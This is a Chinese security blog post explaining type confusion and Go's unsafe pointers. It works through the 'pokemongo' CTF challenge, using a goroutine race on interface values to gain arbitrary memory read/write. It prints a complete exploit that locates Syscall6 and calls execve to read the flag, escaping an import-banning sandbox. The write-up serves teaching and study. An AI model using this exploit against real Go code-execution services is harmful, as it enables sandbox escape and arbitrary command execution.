#  类型混淆之美：Golang类型混淆到RCE  
原创 l0nm4r
                    l0nm4r  烫烫烫烫安全   2026-02-10 07:20  
  
   
  
# Golang 类型混淆到RCE  
## 0x01 类型混淆漏洞  
  
首先了解一下什么是类型混淆漏洞，以及类型混淆漏洞有什么危害。具体内容可以参考这篇文章： https://xz.aliyun.com/news/8187  
  
我在此简单叙述：  
  
比如在 C++ 中，存在两种类型转换：静态类型转换 static_cast  
 和动态类型转换。其中，静态类型转换并不会做过多的转换和检查，滥用静态类型转换就会出现类型混淆问题。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/0Ed4phq7ZpXEkV2rBicMC2fXFJChbyibYicvlM1icc4eIjRhs8NyA3WSWibxFRCBrJxtoWBzzx0t7dUkSAWLfBsR1Ea25YCbnlUQxP5s0icWdXm54/640?wx_fmt=png&from=appmsg "null")  
  
  
在 C++ 中，父类指针可以转换为子类指针，但子类指针不能随意转换为父类指针。因为一般来说，子类会对父类有字段和方法的扩展，强制进行这种转换后，在使用指针时就会遇到如 虚函数任意调用  
、越界读写  
 等问题。  
  
常见的类型混淆漏洞场景还包括子类指针强制转换：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/0Ed4phq7ZpWsvWGmGP9d3GmXBxUoyqgicyhCHcY8QRiczelcmgmB3D6hjkSvAWeLI38u8sR1iaRib0w61EOdCEichuHC4DbD0UnRl4UDX2E6CSiaU/640?wx_fmt=png&from=appmsg "null")  
  
## 0x02 Golang 指针  
  
Golang 在设计时使用安全指针对常规指针增加了限制，主要如下：  
1. 1. 指针不能参与运算，会提示类型不匹配的错误（mismatched type *int/*string/*xx and int）  
  
1. 2. 不同类型的指针不允许相互转换，报错 cannot use &a (type *int) as type *float64 in assignment  
  
1. 3. 不同类型的指针不能比较和相互赋值  
  
但为了方便使用，还是预留了一个 unsafe 指针：unsafe 包用于在编译阶段绕过 Go 语言的类型系统，直接操作内存，让程序拥有直接读写内存的能力，其中 **unsafe.Pointer**  
 为通用指针。  
1. 1. 任何类型的指针都可以被转化为 Pointer  
  
1. 2. Pointer 可以被转化为任何类型的指针  
  
1. 3. uintptr 可以被转化为 Pointer  
  
1. 4. Pointer 可以被转化为 uintptr  
  
1. 5. 支持比较运算等，借助uintptr  
  
如：使用 unsafe.Pointer 把 int64 转换为 float64  
```
package mainimport (    "fmt"    "unsafe")func main() {    x := int64(0x3ff0000000000000) // float64 的位模式：1.0    // *int64 → unsafe.Pointer → *float64    f := (*float64)(unsafe.Pointer(&x))    fmt.Println(*f) // 输出 1}
```  
## 0x03 类型混淆突破沙箱  
  
可能你看到这里还是云里雾里，那类型混淆到底有什么用呢？用一个 CTF 题来仔细感受一下。  
### 3.1 pokemongo  
  
题目备份 & writeup： https://github.com/zhangyoufu/pokemongo  
  
题目描述是：给我一段 Go 代码，我帮你编译、执行，唯一的要求是代码中不能 import  
，请开始你的表演，获取 flag 文件内容。  
  
这道题目由于定义了   
sanitizeAndRun  
 函数来禁用 import，这意味着：  
- • 无法使用标准库（如 os  
、io  
、syscall  
 等）  
  
- • 无法使用 //go:linkname  
 指令（需要 unsafe  
 包）  
  
- • 只能使用 Go 的内置函数（built-in）如 print  
、println  
、make  
、len  
 等  
  
```
func sanitizeAndRun(src string) (string, error) {// 第一步：检查并清理源码（主要是禁止import语句）   sanitized_src, err := sanitize(src) if err != nil { return"", err } // 第二步：编译并运行清理后的源码 return run(sanitized_src) } // sanitize 对Go源码进行安全检查，禁止任何import语句 // 这是题目的核心限制：不允许导入任何包 func sanitize(src string) (string, error) { // 将源码解析为抽象语法树(AST)   fset := token.NewFileSet()   f, err := parser.ParseFile(fset, "", src, parser.AllErrors) if err != nil { return"", err } // 检查AST中是否包含import声明, 如果发现任何import语句，直接拒绝 for _, imp := range f.Imports {     return"", fmt.Errorf("import %v not allowed", imp.Path.Value)   }var buf bytes.Buffer if err := printer.Fprint(&buf, fset, f); err != nil { return"", err } return buf.String(), nil}
```  
  
这里我们可以**利用 Go 的并发机制制造 race condition，实现类型混淆，最终达成任意内存读写**  
。  
### 3.2 利用 Race Condition 实现类型混淆  
  
我们这里先介绍一下   
eface  
 结构。  
```
type eface struct {   _type *_type // 第一个格子：存"这是什么类型"   data unsafe.Pointer // 第二个格子：存"数据在哪里" }
```  
  
举例说明：当我们在 Go 语言中使用 interface{}  
 的时候，对 x 赋不同的值时，会对 _type 和 data 设置为不同的值。  
```
var x interface{} // 编译器在底层创建一个 eface 结构体 x = 42 // eface._type = int类型信息, eface.data = 指向42的指针 x = "hello" // eface._type = string类型信息, eface.data = 指向"hello"的指针 x = []int{1,2,3} // eface._type = []int类型信息, eface.data = 指向切片的指针
```  
  
在这里我们可以看到，如果是并发场景，对 x 赋值并不是一个原子操作。在这个过程中很有可能只赋值了一半，比如已经对 type 赋值了但还没给 data 赋值，这时候就有操作空间了。  
  
youfu 师傅通过下面这个函数来实现把 InputType 的变量转化为 OutputType 的类型。  
```
func typeConfuse[OutputType, InputType any](input *InputType) (output *OutputType) { var intf any stop := falsegofunc() {     for !stop {       intf = any(input)       intf = any(output)     }   }() for {     if ptr, ok := intf.(*OutputType);     ok && ptr != nil {       stop = true      return ptr    }   } }
```  
  
首先，启动一个 goroutine 不断修改 interface 的值。通过不断对 intf 赋值，使其有可能成为 data 为 input、类型为 OutputType 的一个变量。  
  
然后主 goroutine 不断尝试将 interface 断言为 OutputType。当成功观察到类型为 OutputType 但数据是 input 地址时，就实现了类型混淆：获得了一个 OutputType 类型的指针，但它实际指向 InputType 的数据。  
  
这个原语就可以突破前面提到的 Golang 指针限制：  
1. 1. 指针不能参与运算，会提示类型不匹配的错误(mismatched type *int/*string/*xx and int)  
  
1. 2. 不同类型的指针不允许相互转换,报错cannot use &a (type *int) as type *float64 in assignment  
  
1. 3. 不同类型的指针不能比较和相互赋值  
  
### 3.3 任意地址读写  
  
可以用这个原语把指针变量 pdata  
 的值变成可做算术的 uintptr  
 来改写，进而实现任意地址的读写。  
```
var dummy uintptrfunc main() { println() pdata := &dummy paddr := typeConfuse[uintptr](&pdata) *paddr &^= 0xF for *pdata != 0x7C8B480824448B48 {  *paddr -= 0x10 } println("runtime/internal/syscall.Syscall6 @", pdata)}
```  
```
地址         变量      存储的值              说明0x1000   -> dummy  -> 0x0000...           (uintptr值)0x2000   -> pdata  -> 0x1000              (*uintptr，存储dummy的地址)0x3000   -> paddr  -> 0x2000              (*uintptr，存储pdata的地址)
```  
  
这里我们通过 gdb 演示一下这个搜索过程。  
  
![null](https://mmbiz.qpic.cn/mmbiz_png/0Ed4phq7ZpUQPdYNBxYH3hiaicXpq4AbNKw48L16CzhwWiasznCSIicuSZ3icXc5kZXzVf8ZKOOSCGEZ4LSx8brXJN9n1YCBRXR2dRibj8b4xT8O8/640?wx_fmt=png&from=appmsg "null")  
  
  
这里先在内存中寻找对应指令出现的地址。  
  
![null](https://mmbiz.qpic.cn/mmbiz_png/0Ed4phq7ZpXmlew2sHNZdaqotUrY0ZUjicTD0w9JxTR6AQjiaFLMpkRibc15tACGEcuGeOgyLucSDXSzb47qbYypxiawpjRictBYhq6cnFzmrLwc/640?wx_fmt=png&from=appmsg "null")  
  
### 3.4 exploit  
  
完整的思路：  
1. 1. 利用混淆原语获得任意读写的指针，遍历内存获取到 Syscall6 地址  
  
1. 2. 再次利用类型混淆原语，把 Syscall6 地址转化为函数并进行调用执行  
  
完整的 exp： https://github.com/zhangyoufu/pokemongo/blob/master/exploit/exploit.go  
```
package mainfunc typeConfuse[OutputType, InputType any](input *InputType) (output *OutputType) {    var intf any    stop := false    gofunc() {        for !stop {            intf = any(input)            intf = any(output)        }    }()    for {        if ptr, ok := intf.(*OutputType); ok && ptr != nil {            stop = true            return ptr        }    }}var dummy uintptrfunc main() {    println()    pdata := &dummy    paddr := typeConfuse[uintptr](&pdata)    *paddr &^= 0xF    for *pdata != 0x7C8B480824448B48 {        *paddr -= 0x10    }    println("runtime/internal/syscall.Syscall6 @", pdata)    var ppfunc func(_0,_1,_2,_3,_4,_5,_6,_7,_8 uintptr, syscall_nr uintptr, filename *byte, argv **byte, envp **byte)    *typeConfuse[*uintptr](&ppfunc) = paddr    const NR_EXECVE = 59    filename := []byte("/bin/cat\000")    argv := [](*byte){&filename[0], &[]byte("/home/ctf/flag")[0], nil}    ppfunc(0, 1, 2, 3, 4, 5, 6, 7, 8, NR_EXECVE, &filename[0], &argv[0], nil)}
```  
  
  
   
  
  
